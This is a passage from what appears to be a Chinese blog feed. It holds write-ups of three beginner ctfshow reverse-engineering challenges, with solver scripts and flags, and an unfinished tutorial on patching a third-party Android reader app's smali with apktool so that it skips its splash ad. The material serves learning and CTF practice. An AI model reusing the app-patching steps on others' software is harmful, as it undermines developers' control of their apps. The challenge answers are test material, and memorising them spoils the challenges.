        <content type="html"><![CDATA[<h3 id="数学不及格"><a href="#数学不及格" class="headerlink" title="数学不及格"></a>数学不及格</h3><p><img src="/2022/05/26/ctfshow%E8%90%8C%E6%96%B0%E8%B5%9BReverse//image-20220530111536103.png" alt="image-20220530111536103"></p><h4 id="简单分析一下"><a href="#简单分析一下" class="headerlink" title="简单分析一下"></a>简单分析一下</h4><p>下面的应该就是主要的逻辑了，是个算数题目，主要就是数字之间的转换这个样子。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [rsp+14h] [rbp-4Ch]</span></span><br><span class="line">  <span class="type">char</span> *endptr; <span class="comment">// [rsp+18h] [rbp-48h] BYREF</span></span><br><span class="line">  <span class="type">char</span> *v6; <span class="comment">// [rsp+20h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">char</span> *v7; <span class="comment">// [rsp+28h] [rbp-38h] BYREF</span></span><br><span class="line">  <span class="type">char</span> *v8; <span class="comment">// [rsp+30h] [rbp-30h] BYREF</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+38h] [rbp-28h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+40h] [rbp-20h]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+48h] [rbp-18h]</span></span><br><span class="line">  __int64 v12; <span class="comment">// [rsp+50h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v13; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v13 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( argc != <span class="number">5</span> )                              <span class="comment">// 5个参数，包含文件本身</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;argc nonono&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = strtol(argv[<span class="number">4</span>], &amp;endptr, <span class="number">16</span>) - <span class="number">25923</span>;    <span class="comment">// strtol 十六进制字符串转长整型数字</span></span><br><span class="line">  v9 = f(v4);</span><br><span class="line">  v10 = strtol(argv[<span class="number">1</span>], &amp;v6, <span class="number">16</span>);</span><br><span class="line">  v11 = strtol(argv[<span class="number">2</span>], &amp;v7, <span class="number">16</span>);</span><br><span class="line">  v12 = strtol(argv[<span class="number">3</span>], &amp;v8, <span class="number">16</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v9 - v10 != <span class="number">0x233F0E151C</span>LL )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;argv1 nonono!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v9 - v11 != <span class="number">0x1B45F81A32</span>LL )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;argv2 nonono!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v9 - v12 != <span class="number">0x244C071725</span>LL )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;argv3 nonono!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)v4 + v12 + v11 + v10 != <span class="number">0x13A31412F8C</span>LL )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;argv sum nonono!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;well done!decode your argv!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进入f函数，发现v9是个斐波那契数列，emmm，长度为v4</p><h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">v9_v10 = <span class="number">0x233F0E151C</span></span><br><span class="line">v9_v11 = <span class="number">0x1B45F81A32</span></span><br><span class="line">v9_v12 = <span class="number">0x244C071725</span></span><br><span class="line"></span><br><span class="line">v4_v10_v11_v12 = <span class="number">0x13A31412F8C</span></span><br><span class="line"></span><br><span class="line">v93_v4 = v9_v10 + v9_v11 + v9_v12 + v4_v10_v11_v12</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(v93_v4))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fibonacci</span>(<span class="params">n</span>):</span><br><span class="line">    n1 = <span class="number">1</span></span><br><span class="line">    n2 = <span class="number">1</span></span><br><span class="line">    n3 = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> n &lt; <span class="number">1</span> <span class="keyword">or</span> n &gt; <span class="number">200</span>:  <span class="comment"># 输入错误的情况，返回0</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;寄!&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (n - <span class="number">2</span>) &gt; <span class="number">0</span>:</span><br><span class="line">        n3 = n2 + n1</span><br><span class="line">        n1 = n2</span><br><span class="line">        n2 = n3</span><br><span class="line">        n -= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> n3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> v4 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    v9 = fibonacci(v4)</span><br><span class="line">    <span class="keyword">if</span> <span class="number">3</span> * v9 + v4 == v93_v4:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;v4 = <span class="subst">&#123;<span class="built_in">hex</span>(v4 + <span class="number">25923</span>)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;v9 = <span class="subst">&#123;<span class="built_in">hex</span>(v9)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;v10 = <span class="subst">&#123;<span class="built_in">hex</span>(v9 - v9_v10)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;v11 = <span class="subst">&#123;<span class="built_in">hex</span>(v9 - v9_v11)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;v12 = <span class="subst">&#123;<span class="built_in">hex</span>(v9 - v9_v12)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">v4 = <span class="number">0x3a</span></span><br><span class="line">v9 = <span class="number">0x89ab6f7c97</span></span><br><span class="line">v10 = <span class="number">0x666c61677b</span></span><br><span class="line">v11 = <span class="number">0x6e65776265</span></span><br><span class="line">v12 = <span class="number">0x655f686572</span></span><br><span class="line"></span><br><span class="line">v = <span class="string">&quot;3a89ab6f7c97666c61677b6e65776265655f686572&quot;</span></span><br></pre></td></tr></table></figure><h4 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./re3 666c61677b 6e65776265 655f686572 657d</span><br></pre></td></tr></table></figure><p><img src="/2022/05/26/ctfshow%E8%90%8C%E6%96%B0%E8%B5%9BReverse//image-20220527064018771.png" alt="image-20220527064018771"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">666c61677b6e65776265655f686572657d</span><br></pre></td></tr></table></figure><p>hex2str</p><p><img src="/2022/05/26/ctfshow%E8%90%8C%E6%96%B0%E8%B5%9BReverse//image-20220527064108898.png" alt="image-20220527064108898"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;newbee_here&#125;</span><br></pre></td></tr></table></figure><h3 id="flag白给"><a href="#flag白给" class="headerlink" title="flag白给"></a>flag白给</h3><h4 id="查壳"><a href="#查壳" class="headerlink" title="查壳"></a>查壳</h4><p><img src="/2022/05/26/ctfshow%E8%90%8C%E6%96%B0%E8%B5%9BReverse//image-20220527064432567.png" alt="image-20220527064432567"></p><h4 id="脱壳"><a href="#脱壳" class="headerlink" title="脱壳"></a>脱壳</h4><p><img src="/2022/05/26/ctfshow%E8%90%8C%E6%96%B0%E8%B5%9BReverse//image-20220527064518689.png" alt="image-20220527064518689"></p><h4 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h4><p>我真的没想到flag会是这个HackAv。</p><p><img src="/2022/05/26/ctfshow%E8%90%8C%E6%96%B0%E8%B5%9BReverse//image-20220530105617762.png" alt="image-20220530105617762"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;HackAv&#125;</span><br></pre></td></tr></table></figure><h3 id="签退"><a href="#签退" class="headerlink" title="签退"></a>签退</h3><p>给了一个pyc文件，在线反编译一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># visit https://tool.lu/pyc/ for more information</span></span><br><span class="line"><span class="comment"># Version: Python 2.7</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">c_charset = string.ascii_uppercase + string.ascii_lowercase + string.digits + <span class="string">&#x27;()&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;BozjB3vlZ3ThBn9bZ2jhOH93ZaH9&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">origin_bytes</span>):</span><br><span class="line">    c_bytes = [ <span class="string">&#x27;&#123;:0&gt;8&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(<span class="built_in">bin</span>(b)).replace(<span class="string">&#x27;0b&#x27;</span>, <span class="string">&#x27;&#x27;</span>)) <span class="keyword">for</span> b <span class="keyword">in</span> origin_bytes ]</span><br><span class="line">    resp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    nums = <span class="built_in">len</span>(c_bytes) // <span class="number">3</span></span><br><span class="line">    remain = <span class="built_in">len</span>(c_bytes) % <span class="number">3</span></span><br><span class="line">    integral_part = c_bytes[<span class="number">0</span>:<span class="number">3</span> * nums]</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> [</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">6</span>,</span><br><span class="line">        <span class="number">12</span>,</span><br><span class="line">        <span class="number">18</span>]:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">        tmp_unit = [][<span class="built_in">int</span>(tmp_unit[x:x + <span class="number">6</span>], <span class="number">2</span>)]</span><br><span class="line">        resp += <span class="string">&#x27;&#x27;</span>.join([ c_charset[i] <span class="keyword">for</span> i <span class="keyword">in</span> tmp_unit ])</span><br><span class="line">        integral_part = integral_part[<span class="number">3</span>:]</span><br><span class="line">    <span class="keyword">if</span> remain:</span><br><span class="line">        remain_part = <span class="string">&#x27;&#x27;</span>.join(c_bytes[<span class="number">3</span> * nums:]) + (<span class="number">3</span> - remain) * <span class="string">&#x27;0&#x27;</span> * <span class="number">8</span></span><br><span class="line">        tmp_unit = [ <span class="built_in">int</span>(remain_part[x:x + <span class="number">6</span>], <span class="number">2</span>) <span class="keyword">for</span> x <span class="keyword">in</span> [</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">6</span>,</span><br><span class="line">            <span class="number">12</span>,</span><br><span class="line">            <span class="number">18</span>] ][:remain + <span class="number">1</span>]</span><br><span class="line">        resp += <span class="string">&#x27;&#x27;</span>.join([ c_charset[i] <span class="keyword">for</span> i <span class="keyword">in</span> tmp_unit ]) + (<span class="number">3</span> - remain) * <span class="string">&#x27;.&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> rend(resp)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rend</span>(<span class="params">s</span>):</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encodeCh</span>(<span class="params">ch</span>):</span><br><span class="line">        </span><br><span class="line">        f = <span class="keyword">lambda</span> x: <span class="built_in">chr</span>(((<span class="built_in">ord</span>(ch) - x) + <span class="number">2</span>) % <span class="number">26</span> + x)</span><br><span class="line">        <span class="keyword">if</span> ch.islower():</span><br><span class="line">            <span class="keyword">return</span> f(<span class="number">97</span>)</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">None</span>,).isupper():</span><br><span class="line">            <span class="keyword">return</span> f(<span class="number">65</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (<span class="string">&#x27;&#x27;</span>.join,)((<span class="keyword">lambda</span> <span class="number">.0</span>: <span class="keyword">pass</span>)(s))</span><br></pre></td></tr></table></figure><p>上面是个base64编码，下面是个类似仿射密码的东西，不过a&#x3D;1，可以看作凯撒密码。</p><h4 id="GetFlag"><a href="#GetFlag" class="headerlink" title="GetFlag"></a>GetFlag</h4><p>解题脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s = <span class="string">&quot;BozjB3vlZ3ThBn9bZ2jhOH93ZaH9&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> s:</span><br><span class="line">    f = <span class="keyword">lambda</span> x: <span class="built_in">chr</span>(((<span class="built_in">ord</span>(ch) - x) - <span class="number">2</span>) % <span class="number">26</span> + x)</span><br><span class="line">    <span class="keyword">if</span> ch.islower():</span><br><span class="line">        flag += f(<span class="number">97</span>)</span><br><span class="line">    <span class="keyword">elif</span> ch.isupper():</span><br><span class="line">        flag += f(<span class="number">65</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += ch</span><br><span class="line"><span class="built_in">print</span>(b64decode(flag))</span><br><span class="line"><span class="comment"># flag&#123;c_t_f_s_h_0_w_!&#125;</span></span><br></pre></td></tr></table></figure><h4 id="flag-1"><a href="#flag-1" class="headerlink" title="flag"></a>flag</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;c_t_f_s_h_0_w_!&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 杂七杂八 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安卓去广告</title>
      <link href="/2022/05/19/%E7%AC%94%E8%B6%A3%E9%98%81%E5%8E%BB%E5%B9%BF%E5%91%8A/"/>
      <url>/2022/05/19/%E7%AC%94%E8%B6%A3%E9%98%81%E5%8E%BB%E5%B9%BF%E5%91%8A/</url>
      
        <content type="html"><![CDATA[<h2 id="实例一、笔趣阁"><a href="#实例一、笔趣阁" class="headerlink" title="实例一、笔趣阁"></a>实例一、笔趣阁</h2><h3 id="须知"><a href="#须知" class="headerlink" title="须知"></a>须知</h3><p><strong>这个程序是比较简单的一个，我会按着从易到难的顺序，来做这一个个例子</strong>。</p><p>那这个程序，其实是一个非常简单的程序，因为作者开发这个软件本来就是没有广告的。但是，开屏的时候，会出现一段时间的类似开屏广告的东西(但是其实只是一张图片)，所以我逆向这个软件的时侯，其实内心是充满对作者的愧疚的。感慨时间过，接下来开始学习，本文被写，仅用来交流学习。</p><h3 id="GDA分析java代码"><a href="#GDA分析java代码" class="headerlink" title="GDA分析java代码"></a>GDA分析java代码</h3><p>首先将程序拖入GDA、jadx这类的能反编译出java代码的反编译工具，我个人更推荐使用jadx的，如下图：</p><p><img src="/2022/05/19/%E7%AC%94%E8%B6%A3%E9%98%81%E5%8E%BB%E5%B9%BF%E5%91%8A//image-20220519212657582.png" alt="image-20220519212657582"></p><p><strong>最重要的：我实战分析的时候，一般都是查询关键词，从而找到对应的Activity，然后再看程序的逻辑，再看MainActivity。</strong></p><p>那这个例子中，我们需要查的就是，关于广告部分的内容，这里我选择搜索<code>跳过</code>这个关键词，因为开屏的时候，有跳过广告这个按钮。搜索之后发现，开屏广告主要是在<code>NovelWelcomeActivity</code>这个类中的。</p><p><img src="/2022/05/19/%E7%AC%94%E8%B6%A3%E9%98%81%E5%8E%BB%E5%B9%BF%E5%91%8A//image-20220519212909593.png" alt="image-20220519212909593"></p><p>注意到，是下面的这个代码出现了这个<code>跳过</code>关键词，那就分析一下代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">timer</span><span class="params">(<span class="type">long</span> j)</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">long</span> <span class="variable">j2</span> <span class="operator">=</span> j * <span class="number">1000</span>;</span><br><span class="line">        <span class="type">CountDownTimer</span> <span class="variable">novelWelcomeActivity$timer$1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CountDownTimer</span>(j2) &#123; <span class="comment">// from class: io.legado.app.xnovel.work.NovelWelcomeActivity$timer$1</span></span><br><span class="line">            <span class="meta">@Override</span> <span class="comment">// android.os.CountDownTimer</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onTick</span><span class="params">(<span class="type">long</span> j3)</span> &#123;</span><br><span class="line">                <span class="type">RoundTextView</span> <span class="variable">roundTextView</span> <span class="operator">=</span> NovelWelcomeActivity.<span class="built_in">this</span>.getBinding().textview;</span><br><span class="line">                roundTextView.setText(<span class="string">&quot;跳过 &quot;</span> + (j3 / <span class="number">1000</span>));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span> <span class="comment">// android.os.CountDownTimer</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onFinish</span><span class="params">()</span> &#123;</span><br><span class="line">                NovelWelcomeActivity.<span class="built_in">this</span>.goMain();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="built_in">this</span>.countDownTimer = novelWelcomeActivity$timer$<span class="number">1</span>;</span><br><span class="line">        novelWelcomeActivity$timer$<span class="number">1.</span>start();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>简单看一下，其实就是不断更新上面的那个<code>跳过 n 秒</code>的功能，里面并没有什么判断的逻辑出现，故而需要查找其用例。jadx可以直接右键查找用例。</p><p><img src="/2022/05/19/%E7%AC%94%E8%B6%A3%E9%98%81%E5%8E%BB%E5%B9%BF%E5%91%8A//image-20220519213910729.png" alt="image-20220519213910729"></p><p>找到其用例就是上面的函数，注意到这里面出现了非常显眼的<code>goMain()</code>函数，一看就是跳到主界面的函数，再分析一下其他的。上面设置的按钮事件监听函数应该就是跳过广告的。这里主要看try后方的内容，timer调用处是召唤广告的，我们需要将其跳过，我们只需要修改条件<code>!adItemList.isEmpty()</code>为，不管这个<code>adItemList</code>是不是非空都会跳转到<code>goMain()</code>函数才能跳过广告。</p><h3 id="解包apk"><a href="#解包apk" class="headerlink" title="解包apk"></a>解包apk</h3><p>理论有了，下面实操一下。emmm，不知道怎么，jadx不能改smali代码，不能改java代码我尚可理解几分，但是不知道这个强大的工具为什么不能改smali哈。那我们换条路继续走就好了，这里我试了其他几个，但是适用性最强的估计还是使用apktool解包再打包了。</p><p><img src="/2022/05/19/%E7%AC%94%E8%B6%A3%E9%98%81%E5%8E%BB%E5%B9%BF%E5%91%8A//image-20220519214513567.png" alt="image-20220519214513567"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar .\apktool_2.6.1.jar d .\base(2)(1).apk</span><br></pre></td></tr></table></figure><p>成功反编译。</p><h3 id="修改代码"><a href="#修改代码" class="headerlink" title="修改代码"></a>修改代码</h3><p>下面进入关键一步，修改逻辑，首先看到我们想修改逻辑的代码文件的位置</p><p><img src="/2022/05/19/%E7%AC%94%E8%B6%A3%E9%98%81%E5%8E%BB%E5%B9%BF%E5%91%8A//image-20220519214649886.png" alt="image-20220519214649886"></p><p>鼠标悬空即可看到。</p><p><img src="/2022/05/19/%E7%AC%94%E8%B6%A3%E9%98%81%E5%8E%BB%E5%B9%BF%E5%91%8A//image-20220519214733248.png" alt="image-20220519214733248"></p><p>找到文件夹，打开smali文件。</p><p><img src="/2022/05/19/%E7%AC%94%E8%B6%A3%E9%98%81%E5%8E%BB%E5%B9%BF%E5%91%8A//image-20220519214813210.png" alt="image-20220519214813210"></p><p>接下来就是找我们要修改的内容对应的smali代码的位置了，这里可以查找函数名这种关键词。但是其实jadx的代码的行数与smali的<code>.line n</code>是有对应的，如下：</p><p><img src="/2022/05/19/%E7%AC%94%E8%B6%A3%E9%98%81%E5%8E%BB%E5%B9%BF%E5%91%8A//image-20220519215031318.png" alt="image-20220519215031318"></p><p><img src="/2022/05/19/%E7%AC%94%E8%B6%A3%E9%98%81%E5%8E%BB%E5%B9%BF%E5%91%8A//image-20220519215049021.png" alt="image-20220519215049021"></p><p>由上图很容易理解，下面分析smali代码：</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">invoke-interface &#123;v0&#125;, <span class="class">Ljava/util/Collection;</span>-&gt;isEmpty()Z</span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">move-result </span>v0</span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">xor-int/2addr </span>v0, v2</span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">if-eqz </span>v0,<span class="keyword"> :cond_0</span></span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">const/4 </span>v0, 0x0</span><br><span class="line"></span><br><span class="line"><span class="keyword">.line</span> 59<span class="built_in"></span></span><br><span class="line"><span class="built_in">invoke-virtual </span>&#123;v1, v0&#125;, <span class="class">Ljava/util/ArrayList;</span>-&gt;get(I)<span class="class">Ljava/lang/Object;</span></span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">move-result-object </span>v0</span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">check-cast </span>v0, <span class="class">Lio/legado/app/ad/ADItem;</span></span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">invoke-virtual </span>&#123;v0&#125;, <span class="class">Lio/legado/app/ad/ADItem;</span>-&gt;getSecond()J</span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">move-result-wide </span>v2</span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">const-wide/16 </span>v4, 0x1</span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">add-long/2addr </span>v2, v4</span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">invoke-virtual </span>&#123;p0, v2, v3&#125;, <span class="class">Lio/legado/app/xnovel/work/NovelWelcomeActivity;</span>-&gt;timer(J)V</span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">goto </span>:goto_0</span><br><span class="line"></span><br><span class="line"><span class="keyword">.line</span> 61<span class="keyword"></span></span><br><span class="line"><span class="keyword">:cond_0</span><span class="built_in"></span></span><br><span class="line"><span class="built_in">invoke-direct </span>&#123;p0&#125;, <span class="class">Lio/legado/app/xnovel/work/NovelWelcomeActivity;</span>-&gt;goMain()V</span><br></pre></td></tr></table></figure><p>主要到这行代码<code>if-eqz v0, :cond_0</code>，这行代码的意思就是：如果v0中的数等于0的话，就跳转到<code>:cond_0</code>这个标签，而下面我们发现，其实<code>:cond_0</code>对应的就是goMain()函数的实现，我们需要使程序无论如何都跳转到goMain函数。也就是说，无论上面的判断是否成立，我们都需要跳转，此时，我们只需要在接下来一行中加入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if-nez v0, :cond_0</span><br></pre></td></tr></table></figure><p>上面这行代码的含义是如果v0不为0则跳转，正好与他原来的代码互补，也就是说，现在无论如何，我们都会直接goMain了，好耶！</p><p><img src="/2022/05/19/%E7%AC%94%E8%B6%A3%E9%98%81%E5%8E%BB%E5%B9%BF%E5%91%8A//image-20220519215659924.png" 